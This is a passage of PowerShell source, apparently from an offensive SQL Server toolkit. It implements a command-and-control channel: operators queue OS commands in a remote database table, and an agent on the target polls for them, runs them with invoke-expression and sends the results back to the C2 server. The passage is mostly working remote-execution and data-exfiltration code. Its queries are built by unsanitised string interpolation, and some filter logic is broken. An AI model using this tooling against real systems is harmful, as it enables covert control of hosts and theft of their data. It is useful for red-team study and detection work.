        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        # Setup agent node filtering based on servername
        If(-not $ServerName){
            $ServerName = "All"
        }

        # Test connection
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose "$instance : Attempting to set command on C2 Server $Instance for $ServerName agent(s)."
                Write-Verbose "$instance : Command: $Command"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }        

        # Set command for single agent
        $Query = "INSERT dbo.C2COMMANDS (ServerName,Command,Status) VALUES ('$ServerName','$Command','pending')"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose

        Write-Verbose "$instance : Command added for $ServerName agent(s) on C2 server $Instance."
    }

    End
    {
        # Return data
        $TblResults
    }
}


# ----------------------------------
#  Get-SQLC2Command
# ----------------------------------
# Author: Scott Sutherland
Function Get-SQLC2Command
{
    <#
            .SYNOPSIS
            This command gets a command from a table on a remote c2 SQL Server. 
            This command should be run on the c2 agent system so it can pull down 
            any commands the C2 server has for it to execute.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name that contains target table.                      
            .EXAMPLE
            PS C:\> Get-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            PS C:\> Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Execute commands from c2.')]
        [switch]$Execute,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose "$instance : Attempting to grab command from $Instance."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }     
        
        # Check in the server
        Register-SQLC2Agent -Username $Username -Password $Password -Instance $Instance -Database $Database -SuppressVerbose | Out-Null

        # Setup query to grab commands        
        $Query = "SELECT * FROM dbo.c2commands where status like 'pending' and (servername like '$env:COMPUTERNAME' or servername like 'All')"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 

        # check command count
        $CommandCount = $TblResults | measure | select count -ExpandProperty count

        Write-Verbose "$instance : $CommandCount commands were from $Instance."
    }

    End
    {
        # Process command execution
        if($Execute){
            
            # Loop through pending commands
            $TblResults | ForEach-Object {

               # Grab command
               $C2CommandId = $_.cid
               $C2Command = $_.command
               
               # Execute command                             
               Invoke-SQLC2Command -Username $Username -Password $Password -Instance $Instance -Database $Database -Verbose -Command $C2Command -Cid $C2CommandId
            }
        }else{

             # Return data
            $TblResults
        }
    }
 }


# ----------------------------------
#  Invoke-SQLC2Command
# ----------------------------------
# Author: Scott Sutherland
Function Invoke-SQLC2Command
{
    <#
            .SYNOPSIS
            This command should be run on the agent system.  It will execute a OS command locally and 
            return the results to the C2 SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .PARAMETER Command
            The OS command to run.
            .EXAMPLE
            PS C:\> Invoke-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            PS C:\> Invoke-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The OS command to run.')]
        [string]$Command,

        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'This is the unique command id provide from the server.')]
        [Int]$Cid,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        Write-Verbose "Running command $Cid on $env:COMPUTERNAME"
        Write-Verbose "Command: $Command"

        # Run the command
        try{
            $CommandResults = invoke-expression "$Command" 
            Write-Verbose "Command complete." 
            $CommandStatus = "success"
        }catch{
            Write-Verbose "Command failed. Aborting." 
            $CommandStatus = "failed"
        }                         

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }     
        
        # Check in the server
        Register-SQLC2Agent -Username $Username -Password $Password -Instance $Instance -Database $Database -SuppressVerbose | Out-Null

        # Setup query to grab commands      
        Write-Verbose -Message "$Instance : Send command results to $Instance for command $Cid."  
        $Query = "
             -- update command request from server            
	        UPDATE dbo.C2COMMANDS SET lastupdate = (select GETDATE ()),result = '$CommandResults',status='$CommandStatus',command='$Command'
            WHERE CID like $Cid"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 

        # check command count
        $CommandCount = $TblResults.row.count 

        Write-Verbose "$instance : Update sent."        
    }

    End
    {
        # Return data
        $TblResults
    }
 }


# ----------------------------------
#  Get-SQLC2Result
# ----------------------------------
# Author: Scott Sutherland
Function Get-SQLC2Result
{
    <#
            .SYNOPSIS
            This function gets command results from the C2 SQL Server. 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name that contains target table.    
            .PARAMETER ServerName
            Filter by server name.     
            .PARAMETER Cid
            Filter by command id.     
            .PARAMETER Status
            Filter by status.                                                
            .EXAMPLE
            PS C:\> Get-SQLC2Result -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            PS C:\> Get-SQLC2Result -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -Cid 1
            PS C:\> Get-SQLC2Result -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -Status "Success"
            PS C:\> Get-SQLC2Result -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -ServerName "Server1"
            PS C:\> Get-SQLC2Result -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by server name.')]
        [string]$ServerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by Status.')]
        [ValidateSet("pending","success","failed")]
        [string]$Status,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by command ID.')]
        [string]$Cid,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable

        # Create ServerName filter
        if($ServerName){
            $FilterServerName = "WHERE servername like '$ServerName'"
        }else{
            $FilterServerName = ""
        }
            
        # Create Status filter
        if($Status){
            $FilterStatus = "WHERE status like '$Status'"
        }else{
            $FilterStatus = ""
        }
            

        # Create ServerName filter
        if($Cid){
            $FilterCid = "WHERE cid like '$Cid'"
        }else{
            $FilterCid = ""
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose "$instance : Attempting to grab command from $env:COMPUTERNAME ."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }     
                
        # Setup query to grab commands        
        $Query = "
            SELECT * FROM dbo.c2commands 
            $FilterServerName
            $FilterStatus
            $FilterCid
            "
            $Query
        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 

        # check command count
        $CommandCount = $TblResults.row.count 

        Write-Verbose "$instance : $CommandCount commands were from $env:COMPUTERNAME."
    }

    End
    {
        # Return data
        $TblResults
    }
 }
